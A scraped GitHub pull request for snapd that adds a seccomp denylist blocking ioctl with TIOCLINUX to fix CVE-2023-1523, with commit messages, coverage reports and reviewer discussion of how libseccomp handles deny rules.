=== Content from github.com_9c262286_20250111_150338.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcanonical%2Fsnapd%2Fpull%2F12849)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcanonical%2Fsnapd%2Fpull%2F12849)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=canonical%2Fsnapd)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[canonical](/canonical)
/
**[snapd](/canonical/snapd)**
Public

* [Notifications](/login?return_to=%2Fcanonical%2Fsnapd) You must be signed in to change notification settings
* [Fork
  590](/login?return_to=%2Fcanonical%2Fsnapd)
* [Star
   1.9k](/login?return_to=%2Fcanonical%2Fsnapd)

* [Code](/canonical/snapd)
* [Pull requests
  149](/canonical/snapd/pulls)
* [Actions](/canonical/snapd/actions)
* [Projects
  0](/canonical/snapd/projects)
* [Wiki](/canonical/snapd/wiki)
* [Security](/canonical/snapd/security)
* [Insights](/canonical/snapd/pulse)

Additional navigation options

* [Code](/canonical/snapd)
* [Pull requests](/canonical/snapd/pulls)
* [Actions](/canonical/snapd/actions)
* [Projects](/canonical/snapd/projects)
* [Wiki](/canonical/snapd/wiki)
* [Security](/canonical/snapd/security)
* [Insights](/canonical/snapd/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fcanonical%2Fsnapd%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fcanonical%2Fsnapd%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# many: introduce seccomp denylist to block ioctl with TIOCLINUX to fix CVE-2023-1523 #12849

 Merged

[mvo5](/mvo5)
merged 9 commits into
[canonical:master](/canonical/snapd/tree/master "canonical/snapd:master")
from
[alexmurray:CVE-2023-1523](/alexmurray/snapd/tree/CVE-2023-1523 "alexmurray/snapd:CVE-2023-1523")

May 26, 2023

 Merged

# [many: introduce seccomp denylist to block ioctl with TIOCLINUX to fix CVE-2023-1523](#top) #12849

[mvo5](/mvo5)
merged 9 commits into
[canonical:master](/canonical/snapd/tree/master "canonical/snapd:master")
from
[alexmurray:CVE-2023-1523](/alexmurray/snapd/tree/CVE-2023-1523 "alexmurray/snapd:CVE-2023-1523")

May 26, 2023

[Conversation
18](/canonical/snapd/pull/12849)
[Commits
9](/canonical/snapd/pull/12849/commits)
[Checks
0](/canonical/snapd/pull/12849/checks)
[Files changed](/canonical/snapd/pull/12849/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![alexmurray](https://avatars.githubusercontent.com/u/56540?s=60&v=4)](/alexmurray)

Copy link

Contributor

### @alexmurray **[alexmurray](/alexmurray)** commented [May 25, 2023](#issue-1725813490)

Update snap-seccomp to support explicitly denying certain syscall argument combinations via a new `~` prefix - and use this to block the use of `ioctl` with `TIOCLINUX` - to fix snapd [CVE-2023-1523](https://github.com/advisories/GHSA-55wx-23fj-c2v5 "CVE-2023-1523") (similar to flatpak CVE-2023-28100 [GHSA-7qpw-3vjv-xrqp](https://github.com/flatpak/flatpak/security/advisories/GHSA-7qpw-3vjv-xrqp "GHSA-7qpw-3vjv-xrqp"))

Sorry, something went wrong.

All reactions

 [alexmurray](/alexmurray)
added 5 commits
[May 25, 2023 21:41](#commits-pushed-0e87906)

[![@alexmurray](https://avatars.githubusercontent.com/u/56540?s=40&v=4)](/alexmurray)

`[snap-seccomp: support explicitly blocking of syscalls](/canonical/snapd/pull/12849/commits/0e879069008948ab15624473c597c72190b6848e "snap-seccomp: support explicitly blocking of syscalls

snap-seccomp has always implemented an allow-list approach to syscalls - such
that the listed syscalls are allowed and any non-listed will get
blocked. However, in the case where we want to disallow a syscall with
particular arguments, it is only possible to block one instance of the sycall
with a given argument. If a second similar rule is added, each rule effectively
allows the other and so neither get disallowed as a result.

So introduce the concept of explicitly denying system calls listed in the
seccomp profile by prefixing them with a tilde (~). The seccomp action for these
is then EACCES (since EPERM is the default for unmatched syscalls and seccomp
doesn't allow to specify an action which is the same as the default).

This then allows to specify to block various syscall argument combinations as
expected, and so is used as the mechanism to fix CVE-2023-1523.

Signed-off-by: Alex Murray <alex.murray@canonical.com>")`
 ‚Ä¶

`[0e87906](/canonical/snapd/pull/12849/commits/0e879069008948ab15624473c597c72190b6848e)`

```
snap-seccomp has always implemented an allow-list approach to syscalls - such
that the listed syscalls are allowed and any non-listed will get
blocked. However, in the case where we want to disallow a syscall with
particular arguments, it is only possible to block one instance of the sycall
with a given argument. If a second similar rule is added, each rule effectively
allows the other and so neither get disallowed as a result.

So introduce the concept of explicitly denying system calls listed in the
seccomp profile by prefixing them with a tilde (~). The seccomp action for these
is then EACCES (since EPERM is the default for unmatched syscalls and seccomp
doesn't allow to specify an action which is the same as the default).

This then allows to specify to block various syscall argument combinations as
expected, and so is used as the mechanism to fix [CVE-2023-1523](https://github.com/advisories/GHSA-55wx-23fj-c2v5 "CVE-2023-1523").

Signed-off-by: Alex Murray <alex.murray@canonical.com>
```

[![@alexmurray](https://avatars.githubusercontent.com/u/56540?s=40&v=4)](/alexmurray)

`[interfaces/seccomp: explicitly disallow the use of ioctl + TIOCLINUX](/canonical/snapd/pull/12849/commits/c88f61137bfbd49fa1f75a54d6c51ec03ab10b13 "interfaces/seccomp: explicitly disallow the use of ioctl + TIOCLINUX

Fixes CVE-2023-1523

Signed-off-by: Alex Murray <alex.murray@canonical.com>")`
 ‚Ä¶

`[c88f611](/canonical/snapd/pull/12849/commits/c88f61137bfbd49fa1f75a54d6c51ec03ab10b13)`

```
Fixes [CVE-2023-1523](https://github.com/advisories/GHSA-55wx-23fj-c2v5 "CVE-2023-1523")

Signed-off-by: Alex Murray <alex.murray@canonical.com>
```

[![@alexmurray](https://avatars.githubusercontent.com/u/56540?s=40&v=4)](/alexmurray)

`[snap-seccomp-blacklist: also disallow the use of ioctl + TIOCLINUX](/canonical/snapd/pull/12849/commits/997dbfd5327d6e429f63ae7adc2bf2b31f070931 "snap-seccomp-blacklist: also disallow the use of ioctl + TIOCLINUX

Fixes CVE-2023-1523

Signed-off-by: Alex Murray <alex.murray@canonical.com>")`
 ‚Ä¶

`[997dbfd](/canonical/snapd/pull/12849/commits/997dbfd5327d6e429f63ae7adc2bf2b31f070931)`

```
Fixes [CVE-2023-1523](https://github.com/advisories/GHSA-55wx-23fj-c2v5 "CVE-2023-1523")

Signed-off-by: Alex Murray <alex.murray@canonical.com>
```

[![@alexmurray](https://avatars.githubusercontent.com/u/56540?s=40&v=4)](/alexmurray)

`[tests/main/snap-seccomp-blocks-tty-injection: spread test](/canonical/snapd/pull/12849/commits/015190d16c8c8c4a61975d12baf6ea6ce1cf257a "tests/main/snap-seccomp-blocks-tty-injection: spread test CVE-2023-1523

Add a spread test which exercises the two tty injection PoCs for both
CVE-2023-1523 and CVE-2019-7303

Signed-off-by: Alex Murray <alex.murray@canonical.com>") [CVE-2023-1523](https://github.com/advisories/GHSA-55wx-23fj-c2v5 "CVE-2023-1523")`
 ‚Ä¶

`[015190d](/canonical/snapd/pull/12849/commits/015190d16c8c8c4a61975d12baf6ea6ce1cf257a)`

```
Add a spread test which exercises the two tty injection PoCs for both
[CVE-2023-1523](https://github.com/advisories/GHSA-55wx-23fj-c2v5 "CVE-2023-1523") and [CVE-2019-7303](https://github.com/advisories/GHSA-hhhq-qgvm-w5hp "CVE-2019-7303")

Signed-off-by: Alex Murray <alex.murray@canonical.com>
```

[![@alexmurray](https://avatars.githubusercontent.com/u/56540?s=40&v=4)](/alexmurray)

`[cmd/snap-seccomp: Group similar variables together](/canonical/snapd/pull/12849/commits/5b8b1ddefdc799e316ece343c84015fbefcbbce7 "cmd/snap-seccomp: Group similar variables together

Signed-off-by: Alex Murray <alex.murray@canonical.com>")`
 ‚Ä¶

`[5b8b1dd](/canonical/snapd/pull/12849/commits/5b8b1ddefdc799e316ece343c84015fbefcbbce7)`

```
Signed-off-by: Alex Murray <alex.murray@canonical.com>
```

[![mvo5](https://avatars.githubusercontent.com/u/914418?s=60&v=4)](/mvo5)

**[mvo5](/mvo5)**
approved these changes
[May 25, 2023](#pullrequestreview-1443879429)

 [View reviewed changes](/canonical/snapd/pull/12849/files/5b8b1ddefdc799e316ece343c84015fbefcbbce7)

Copy link

Contributor

### @mvo5 **[mvo5](/mvo5)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Thank you

Sorry, something went wrong.

All reactions

[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)
[mvo5](/mvo5)
added this to the [2.59](/canonical/snapd/milestone/46) milestone
[May 25, 2023](#event-9340057388)

 [alexmurray](/alexmurray)
and others
added 2 commits
[May 25, 2023 22:54](#commits-pushed-7cefecb)

[![@alexmurray](https://avatars.githubusercontent.com/u/56540?s=40&v=4)](/alexmurray)

`[tests/main/snap-seccomp-blocks-tty-injection: fix shellcheck errors](/canonical/snapd/pull/12849/commits/7cefecb1dc7be0f48e6b66b672903c89fc9e15dc "tests/main/snap-seccomp-blocks-tty-injection: fix shellcheck errors

Signed-off-by: Alex Murray <alex.murray@canonical.com>")`
 ‚Ä¶

`[7cefecb](/canonical/snapd/pull/12849/commits/7cefecb1dc7be0f48e6b66b672903c89fc9e15dc)`

```
Signed-off-by: Alex Murray <alex.murray@canonical.com>
```

[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&v=4)](/mvo5)

`[tests: fix snap-seccomp-blocks-tty-injection on partially confined sy‚Ä¶](/canonical/snapd/pull/12849/commits/362f2db151f49bac13f0adb1d49b9561b713710b "tests: fix snap-seccomp-blocks-tty-injection on partially confined systems and on ubuntu core")`
 ‚Ä¶

`[362f2db](/canonical/snapd/pull/12849/commits/362f2db151f49bac13f0adb1d49b9561b713710b)`

```
‚Ä¶stems and on ubuntu core
```

[![@codecov-commenter](https://avatars.githubusercontent.com/u/65553080?s=80&u=b7ee84d82e25b493051d810390e97b15f716d7ef&v=4)](/codecov-commenter)

Copy link

### **[codecov-commenter](/codecov-commenter)** commented [May 25, 2023](#issuecomment-1563362763) ‚Ä¢ edited Loading

|  |  |  |  |  |  |  |  |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| [Codecov](https://app.codecov.io/gh/snapcore/snapd/pull/12849?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore) Report Merging [#12849](https://app.codecov.io/gh/snapcore/snapd/pull/12849?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore) ([371f7b5](https://github.com/canonical/snapd/commit/371f7b52e83db27206d29eeb00e00a8abb7666d0)) into [master](https://app.codecov.io/gh/snapcore/snapd/commit/a91821c304d64b0967bcc893f0f363fcbcb52e9e?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore) ([a91821c](https://github.com/canonical/snapd/commit/a91821c304d64b0967bcc893f0f363fcbcb52e9e)) will **increase** coverage by `0.00%`. The diff coverage is `100.00%`.  ‚ùó Your organization is not using the GitHub App Integration. As a result you may experience degraded service beginning May 15th. Please [install the Github App Integration](https://github.com/apps/codecov) for your organization. [Read more](https://about.codecov.io/blog/codecov-is-updating-its-github-integration/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore).  ``` @@           Coverage Diff           @@ ##           master   #12849   +/-   ## =======================================   Coverage   78.60%   78.61%            =======================================   Files         990      991    +1        Lines      122688   122768   +80      ======================================= + Hits        96443    96508   +65      - Misses      20176    20187   +11      - Partials     6069     6073    +4      ```  | Flag | Coverage Œî |  | | --- | --- | --- | | unittests | `78.61% <100.00%> (+<0.01%)` | ‚¨ÜÔ∏è |   Flags with carried forward coverage won't be shown. [Click here](https://docs.codecov.io/docs/carryforward-flags?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore#carryforward-flags-in-the-pull-request-comment) to find out more.   | [Impacted Files](https://app.codecov.io/gh/snapcore/snapd/pull/12849?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore) | Coverage Œî |  | | --- | --- | --- | | [cmd/snap-seccomp/main.go](https://app.codecov.io/gh/snapcore/snapd/pull/12849?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore#diff-Y21kL3NuYXAtc2VjY29tcC9tYWluLmdv) | `63.38% <100.00%> (+0.88%)` | ‚¨ÜÔ∏è |   ... and [6 files with indirect coverage changes](https://app.codecov.io/gh/snapcore/snapd/pull/12849/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore)  üì£ We‚Äôre building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore) |

All reactions

Sorry, something went wrong.

[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&v=4)](/mvo5)

`[tests: fix snap-seccomp-blocks-tty-injection on 32bit systems](/canonical/snapd/pull/12849/commits/f890b2f10659e2724e462aec4afe066ad8b7156a "tests: fix snap-seccomp-blocks-tty-injection on 32bit systems")`

`[f890b2f](/canonical/snapd/pull/12849/commits/f890b2f10659e2724e462aec4afe066ad8b7156a)`

 [![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)
[mvo5](/mvo5)
[force-pushed](/canonical/snapd/compare/37f14c096cb9e7d11d56984db03cb3fdaa1c6705..f890b2f10659e2724e462aec4afe066ad8b7156a)
the
CVE-2023-1523

branch
from
[`37f14c0`](/canonical/snapd/commit/37f14c096cb9e7d11d56984db03cb3fdaa1c6705) to
[`f890b2f`](/canonical/snapd/commit/f890b2f10659e2724e462aec4afe066ad8b7156a)  [Compare](/canonical/snapd/compare/37f14c096cb9e7d11d56984db03cb3fdaa1c6705..f890b2f10659e2724e462aec4afe066ad8b7156a)
[May 25, 2023 20:22](#event-9344161563)

[![@alexmurray](https://avatars.githubusercontent.com/u/56540?s=80&u=ac4e9ffa7c37feced72e2bb27d16117c994e45b8&v=4)](/alexmurray)

Copy link

Contributor

Author

### **[alexmurray](/alexmurray)** commented [May 25, 2023](#issuecomment-1563538935)

| Thanks for all the fixups [@mvo5](https://github.com/mvo5) |
| --- |

All reactions

Sorry, something went wrong.

[![@alexmurray](https://avatars.githubusercontent.com/u/56540?s=80&u=ac4e9ffa7c37feced72e2bb27d16117c994e45b8&v=4)](/alexmurray)

Copy link

Contributor

Author

### **[alexmurray](/alexmurray)** commented [May 26, 2023](#issuecomment-1563719451)

| spread tests look good - thanks again [@mvo5](https://github.com/mvo5) for fixing the various deficiencies in my code (we really need a way to get spread runs on private github forks so that we can test the other arches / platforms more easily before brining these changes public...) |
| --- |

All reactions

Sorry, something went wrong.

[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)
[mvo5](/mvo5)
mentioned this pull request
[May 26, 2023](#ref-pullrequest-1727051676)

[many: introduce seccomp denylist to block ioctl with TIOCLINUX to fix CVE-2023-1523 (2.59)
#12854](/canonical/snapd/pull/12854)
 Merged

[![valentindavid](https://avatars.githubusercontent.com/u/432830?s=60&v=4)](/valentindavid)

**[valentindavid](/valentindavid)**
approved these changes
[May 26, 2023](#pullrequestreview-1445516023)

 [View reviewed changes](/canonical/snapd/pull/12849/files/f890b2f10659e2724e462aec4afe066ad8b7156a)

Copy link

Contributor

### @valentindavid **[valentindavid](/valentindavid)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Looks good. I just have a few minor questions.

Sorry, something went wrong.

All reactions

[cmd/snap-seccomp/main\_test.go](/canonical/snapd/pull/12849/files/0e879069008948ab15624473c597c72190b6848e#diff-8d759868bb823e3cf21365548830a7a3b0fbd4369725784e7b8ecad7c9677424)
Outdated

Show resolved

Hide resolved

[cmd/snap-seccomp/main\_test.go](/canonical/snapd/pull/12849/files/0e879069008948ab15624473c597c72190b6848e#diff-8d759868bb823e3cf21365548830a7a3b0fbd4369725784e7b8ecad7c9677424)

Show resolved

Hide resolved

[interfaces/seccomp/template.go](/canonical/snapd/pull/12849/files/0e879069008948ab15624473c597c72190b6848e..c88f61137bfbd49fa1f75a54d6c51ec03ab10b13#diff-e237f38daa95a5948b90560371ba2651d3af1730a5bd31f2bf13f821d9668272)

Show resolved

Hide resolved

[tests/main/snap-seccomp-blocks-tty-injection/task.yaml](/canonical/snapd/pull/12849/files/362f2db151f49bac13f0adb1d49b9561b713710b..f890b2f10659e2724e462aec4afe066ad8b7156a#diff-1562cf59d08c3a61766b03fcf7b51de78af6b27834254b485db76fdb8c50c34e)

Show resolved

Hide resolved

[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)
[mvo5](/mvo5)
mentioned this pull request
[May 26, 2023](#ref-pullrequest-1727639339)

[tests: spread test from #12849 in isolation
#12856](/canonical/snapd/pull/12856)
 Closed

[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&v=4)](/mvo5)

`[many: add a bunch of TODO/FIXME for a followup :)](/canonical/snapd/pull/12849/commits/371f7b52e83db27206d29eeb00e00a8abb7666d0 "many: add a bunch of TODO/FIXME for a followup :)")`

`[371f7b5](/canonical/snapd/pull/12849/commits/371f7b52e83db27206d29eeb00e00a8abb7666d0)`

 [![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)
[mvo5](/mvo5)
[force-pushed](/canonical/snapd/compare/04f7b0a7e43a17d0d676b262e41b6a050b7611ad..371f7b52e83db27206d29eeb00e00a8abb7666d0)
the
CVE-2023-1523

branch
from
[`04f7b0a`](/canonical/snapd/commit/04f7b0a7e43a17d0d676b262e41b6a050b7611ad) to
[`371f7b5`](/canonical/snapd/commit/371f7b52e83db27206d29eeb00e00a8abb7666d0)  [Compare](/canonical/snapd/compare/04f7b0a7e43a17d0d676b262e41b6a050b7611ad..371f7b52e83db27206d29eeb00e00a8abb7666d0)
[May 26, 2023 14:09](#event-9351300968)

[![mvo5](https://avatars.githubusercontent.com/u/914418?s=60&v=4)](/mvo5)

**[mvo5](/mvo5)**
reviewed
[May 26, 2023](#pullrequestreview-1446337180)

 [View reviewed changes](/canonical/snapd/pull/12849/files/371f7b52e83db27206d29eeb00e00a8abb7666d0)

[cmd/snap-seccomp/main.go](/canonical/snapd/pull/12849/files/371f7b52e83db27206d29eeb00e00a8abb7666d0#diff-440df2ff283e2d802db5f0ff7a78adda6992d99f7f8ed7451ec2b834f0838a73)

|  |  | // fish out syscall |
| --- | --- | --- |
|  |  | syscallName := tokens[0] |
|  |  | if strings.HasPrefix(syscallName, "~") { |

Copy link

Contributor

### @mvo5 **[mvo5](/mvo5)** [May 26, 2023](#discussion_r1206855700)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

After some playing and poking I think this is okay short term but I think we should replace it ASAP in a followup. The issue is that it seems like libseccomp will "optimize" rules away. As it is designed as an allow-list, the behavior of this:

```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl

```

is counter intuitive - it will generate an allow rule for "ioctl" and discard the "~ioctl" entirely:

```
echo -e '~ioctl - TIOCSTI\nioctl\n' > seccomp-profile && SNAP_SECCOMP_DEBUG=1  ./snap-seccomp compile seccomp-profile /tmp/xxx
#
# pseudo filter code start
#
# filter for arch x86_64 (3221225534)
if ($arch == 3221225534)
  # filter for syscall "ioctl" (16) [priority: 65535]
  if ($syscall == 16)
    action ALLOW;
  # default action
  action ERRNO(1);

```

this only works as expected hen combined with another specific rule like:

```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl - !TIOCSTI

```

see

```
$ echo -e '~ioctl - TIOCSTI\n~ioctl - TIOCLINUX\nioctl - !TIOCSTI' > seccomp-profile && SNAP_SECCOMP_DEBUG=1  ./snap-seccomp compile seccomp-profile /tmp/xxx
#
# pseudo filter code start
#
# filter for arch x86_64 (3221225534)
if ($arch == 3221225534)
  # filter for syscall "ioctl" (16) [priority: 65532]
  if ($syscall == 16)
    if ($a1.hi32 == 0)
      if ($a1.lo32 == 21532)
        action ERRNO(13);
      if ($a1.lo32 == 21522)
        action ERRNO(13);
      else
        action ALLOW;
    else
      action ALLOW;
  # default action
  action ERRNO(1);

```

Sorry, something went wrong.

All reactions

Copy link

Contributor

### @mvo5 **[mvo5](/mvo5)** [May 26, 2023](#discussion_r1206856628)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I think we probably want instead of "~" a new: `ioctl - !TIOCSTI&&!TIOCLINUX`

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @alexmurray **[alexmurray](/alexmurray)** [May 29, 2023](#discussion_r1208719297)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Unfortunately there is no way to express this in the libseccomp API <https://libseccomp.readthedocs.io/en/latest/man/man3/seccomp_rule_add.3/> that I am aware of - we can only do something like 'compare argument 1 is equal to this value' or 'compare argument 1 is greater than this value' - we can't do higher level operations like booleans etc - so I don't think that is possible with libseccomp. If we were to write the BPF filter by hand we could add this but that would be a significant departure from the current implementation.

Sorry, something went wrong.

All reactions

[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=80&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)

Copy link

Contributor

### **[mvo5](/mvo5)** commented [May 26, 2023](#issuecomment-1564468541)

| So just to clarify - I think we want to tweak this a bit but it's also working correctly and protecting from TIOCLINUX so it's fine to go in but for long term maintainence I think we need something slightly different in the near future. |
| --- |

All reactions

Sorry, something went wrong.

[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)
[mvo5](/mvo5)
merged commit [`d7b49dd`](/canonical/snapd/commit/d7b49dd6f5911eed28cc765e39204bccd2382821)
into
canonical:master

[May 26, 2023](https://github.com/canonical/snapd/pull/12849#event-9352677022)

[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)
[mvo5](/mvo5)
added
the
[cherry-picked](/canonical/snapd/labels/cherry-picked)
label
[May 27, 2023](#event-9356358454)

[mvo5](/mvo5)
added a commit
to mvo5/snappy
that referenced
this pull request
[Jul 10, 2023](#ref-commit-c89d339)
[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)

`[snap-{seccomp,confine}: rework seccomp denylist](/mvo5/snappy/commit/c89d3395a9fb6ecdcdc6d8116e70b37c6b5de79c "snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because of the way libseccomp is working.

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700")`
‚Ä¶

`[c89d339](/mvo5/snappy/commit/c89d3395a9fb6ecdcdc6d8116e70b37c6b5de79c)`

```
When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because of the way libseccomp is working.

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] [canonical#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
```

[mvo5](/mvo5)
added a commit
to mvo5/snappy
that referenced
this pull request
[Jul 10, 2023](#ref-commit-8b106ad)
[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)

`[snap-{seccomp,confine}: rework seccomp denylist](/mvo5/snappy/commit/8b106ad2bf7963c364a8608aae0e302ea5cd87ce "snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because of the way libseccomp is working.

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
